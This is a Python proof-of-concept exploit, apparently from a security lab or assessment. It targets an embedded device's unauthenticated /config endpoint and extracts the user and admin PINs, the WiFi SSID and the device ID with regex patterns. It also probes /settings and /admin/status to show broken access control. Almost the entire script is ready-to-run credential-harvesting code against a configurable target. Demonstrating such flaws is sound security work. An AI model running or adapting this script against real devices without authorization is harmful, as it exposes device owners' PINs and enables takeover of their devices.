#!/usr/bin/env python3
"""
Unauthenticated Configuration Dump

Fetches the /config endpoint (no authentication required) and displays
all leaked sensitive information. Optionally compares with the /settings
endpoint (which requires admin JWT) to demonstrate the access control gap.
"""

import argparse
import re
import sys
import urllib.request
import urllib.error


DEFAULT_TARGET = "http://192.168.4.1"

# Patterns to identify sensitive fields in the config response
SENSITIVE_PATTERNS = [
    (r"User PIN:\s*(\S+)", "User PIN"),
    (r"Admin PIN:\s*(\S+)", "Admin PIN"),
    (r"WiFi SSID:\s*(\S+)", "WiFi SSID"),
    (r"Device ID:\s*(\S+)", "Device ID"),
    (r"Debug Mode:\s*(\S+)", "Debug Mode"),
]


def fetch_url(url, timeout=10):
    """Fetch a URL and return (status_code, body_text) or raise on error."""
    try:
        req = urllib.request.Request(url)
        resp = urllib.request.urlopen(req, timeout=timeout)
        body = resp.read().decode("utf-8", errors="replace")
        return resp.getcode(), body
    except urllib.error.HTTPError as e:
        body = ""
        try:
            body = e.read().decode("utf-8", errors="replace")
        except Exception:
            pass
        return e.code, body
    except urllib.error.URLError as e:
        print(f"ERROR: Could not connect to {url}: {e.reason}", file=sys.stderr)
        sys.exit(1)


def parse_secrets(text):
    """Extract sensitive key-value pairs from config response text."""
    secrets = []
    for pattern, label in SENSITIVE_PATTERNS:
        match = re.search(pattern, text)
        if match:
            secrets.append((label, match.group(1)))
    return secrets


def dump_config(target):
    """Fetch /config endpoint and display leaked information."""
    url = f"{target}/config"
    print(f"[*] Fetching {url} (no authentication)...")
    print()

    status, body = fetch_url(url)

    if status != 200:
        print(f"[!] Unexpected status code: {status}")
        print(f"    Response: {body[:200]}")
        return False

    print(f"[+] HTTP {status} OK - endpoint accessible without authentication")
    print()
    print("--- Raw Response ---")
    print(body)
    print("--- End Response ---")
    print()

    secrets = parse_secrets(body)
    if secrets:
        print(f"[+] Found {len(secrets)} sensitive field(s):")
        print()
        for label, value in secrets:
            print(f"    {label}: {value}")
        print()
    else:
        print("[!] No recognized sensitive fields found in response.")
        print("    The response may use a different format than expected.")

    return True


def check_settings(target):
    """Attempt to access /settings without auth to show the contrast."""
    url = f"{target}/settings"
    print(f"[*] Fetching {url} (no authentication)...")

    status, body = fetch_url(url)

    if status == 401:
        print(f"[+] HTTP {status} Unauthorized - /settings requires authentication")
        print(f"    Response: {body.strip()[:100]}")
    elif status == 200:
        print(f"[!] HTTP {status} OK - /settings is ALSO unprotected (unexpected)")
        print(f"    Response: {body[:200]}")
    else:
        print(f"[*] HTTP {status} - {body.strip()[:100]}")

    return status


def check_admin_status(target):
    """Attempt to access /admin/status without auth."""
    url = f"{target}/admin/status"
    print(f"[*] Fetching {url} (no authentication)...")

    status, body = fetch_url(url)

    if status == 401:
        print(f"[+] HTTP {status} Unauthorized - /admin/status requires authentication")
    elif status == 200:
        print(f"[!] HTTP {status} OK - /admin/status is ALSO unprotected")
    else:
        print(f"[*] HTTP {status} - {body.strip()[:100]}")

    return status


def main():
    parser = argparse.ArgumentParser(
        description="Dump unauthenticated device configuration and compare with "
                    "protected endpoints to demonstrate broken access control.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s
      Fetch /config from default target (http://192.168.4.1)

  %(prog)s --target http://192.168.4.1
      Fetch /config from specified target

  %(prog)s --compare
      Also check /settings and /admin/status to show access control gap

  %(prog)s --target http://10.0.0.5 --compare
      Full comparison against a custom target
""")
    parser.add_argument("--target", "-t", default=DEFAULT_TARGET,
                        help="Device URL (default: %(default)s)")
    parser.add_argument("--compare", "-c", action="store_true",
                        help="Compare with /settings and /admin/status (auth-required endpoints)")

    args = parser.parse_args()

    target = args.target.rstrip("/")

    print("=" * 60)
    print("Unauthenticated Configuration Dump")
    print("=" * 60)
    print()

    success = dump_config(target)

    if args.compare:
        print()
        print("-" * 60)
        print("Access Control Comparison")
        print("-" * 60)
        print()

        settings_status = check_settings(target)
        print()
        admin_status = check_admin_status(target)

        print()
        print("-" * 60)
        print("Summary")
        print("-" * 60)
        print()
        print("  /config       -> 200 OK (NO AUTH) - leaks PINs, SSID, device ID")
        print(f"  /settings     -> {settings_status} (requires admin JWT)")
        print(f"  /admin/status -> {admin_status} (requires admin JWT)")
        print()
        print("  The /config endpoint lacks the authentication check that")
        print("  protects /settings and /admin/status. This is broken access")
        print("  control (OWASP A01:2021).")

    if not success:
        sys.exit(1)


if __name__ == "__main__":
    main()
